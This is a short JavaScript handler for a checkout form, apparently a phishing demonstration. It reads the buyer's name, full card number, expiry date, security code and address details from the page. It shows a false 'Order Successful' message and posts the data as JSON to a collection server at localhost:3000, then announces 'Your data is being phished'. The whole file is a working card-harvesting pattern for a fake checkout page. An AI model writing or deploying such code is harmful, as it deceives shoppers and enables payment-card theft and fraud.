document.getElementById('checkoutForm').addEventListener('submit', function(event) {
    event.preventDefault(); 
    
    const formData = {
        firstName: document.getElementById('FN').value,
        lastName: document.getElementById('LN').value,
        cardNumber: document.getElementById('cardNumber').value,
        expiryDate: document.getElementById('expiryDate').value,
        securityCode: document.getElementById('securityCode').value,
        country: document.getElementById('country').value,
        postalCode: document.getElementById('postalCode').value,
        gst: document.getElementById('gst').value
    };
    alert('Order Successful');

    fetch('http://localhost:3000/submit-form', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
        alert('Your data is being phished', data);
        // Optionally, you can redirect the user or display a success message here
    })
    .catch(error => {
        console.error('Error saving form data:', error);
        // Optionally, you can display an error message here
    });
});


